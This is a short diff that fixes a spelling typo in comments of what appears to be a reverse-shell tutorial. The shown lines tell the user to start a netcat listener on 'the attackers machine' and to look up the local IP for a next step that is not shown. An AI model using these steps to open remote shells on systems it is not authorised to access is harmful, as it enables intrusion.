@@ -3,7 +3,7 @@
 # FIRST STEP(s):
 # run this on the attackers machine
     nc -l 'any port'
-# This initialzes your computers listening protocol to look for TCP connections
+# This initializes your computers listening protocol to look for TCP connections
 # IMPORTANT
 # open another Terminal window and run to obtain your computers local ip (this is important for the next step)
     ipconfig getifaddr en0
